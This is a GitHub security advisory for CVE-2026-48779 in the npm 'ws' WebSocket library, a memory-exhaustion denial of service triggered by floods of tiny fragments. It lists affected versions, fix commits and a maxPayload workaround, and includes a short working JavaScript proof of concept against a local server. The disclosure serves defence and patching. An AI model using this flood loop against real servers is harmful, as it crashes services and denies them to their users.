# [H] ws: Memory exhaustion DoS from tiny fragments and data chunks

## Summary
Severity: High
Advisory: GHSA-96hv-2xvq-fx4p
CVE: CVE-2026-48779
CWE: CWE-1050, CWE-400, CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-96hv-2xvq-fx4p
Type: github-advisory

## Affected
- npm: `ws` — affected >=1.1.0 <5.2.5
- npm: `ws` — affected >=6.0.0 <6.2.4
- npm: `ws` — affected >=7.0.0 <7.5.11
- npm: `ws` — affected >=8.0.0 <8.21.0

## Details
### Impact

A high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.

### Proof of concept

```js
import { WebSocket, WebSocketServer } from 'ws';

const wss = new WebSocketServer({ port: 0 }, function () {
  const data = Buffer.alloc(1);
  const options = { fin: false };
  const { port } = wss.address();
  const ws = new WebSocket(`ws://localhost:${port}`);

  ws.on('open', function () {
    (function send() {
      ws.send(data, options, function (err) {
        if (err) return;
        send();
      });
    })();
  });

  ws.on('error', console.error);
  ws.on('close', function (code, reason) {
    console.log(`client close - code: ${code} reason: ${reason.toString()}`);
  });
});

wss.on('connection', function (ws) {
  ws.on('error', console.error);
  ws.on('close', function (code, reason) {
    console.log(`server close - code: ${code} reason: ${reason.toString()}`);
  });
});
```

### Patches

The vulnerability was fixed in ws@8.21.0 (https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94) and backported to ws@7.5.11 (https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8), ws@6.2.4 (https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7), and ws@5.2.5 (https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53).

### Workarounds

In vulnerable versions, the issue can be mitigated by lowering the value of the `maxPayload` option if possible.

### Credits

The vulnerability was responsibly disclosed and fixed by [Nadav Magier](https://github.com/Nadav0077).

## References
- https://github.com/websockets/ws/security/advisories/GHSA-96hv-2xvq-fx4p
- https://nvd.nist.gov/vuln/detail/CVE-2026-48779
- https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8
- https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94
- https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53
- https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7
- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48779.json
- https://github.com/websockets/ws
- https://bugzilla.redhat.com/show_bug.cgi?id=2489661
- https://access.redhat.com/security/cve/CVE-2026-48779
- https://access.redhat.com/errata/RHSA-2026:37272
- https://access.redhat.com/errata/RHSA-2026:36820
- https://access.redhat.com/errata/RHSA-2026:36754
- https://access.redhat.com/errata/RHSA-2026:34342
- https://access.redhat.com/errata/RHSA-2026:33574
- https://access.redhat.com/errata/RHSA-2026:33183
- https://access.redhat.com/errata/RHSA-2026:33173
- https://access.redhat.com/errata/RHSA-2026:33163
- https://access.redhat.com/errata/RHSA-2026:33160
- https://access.redhat.com/errata/RHSA-2026:33155
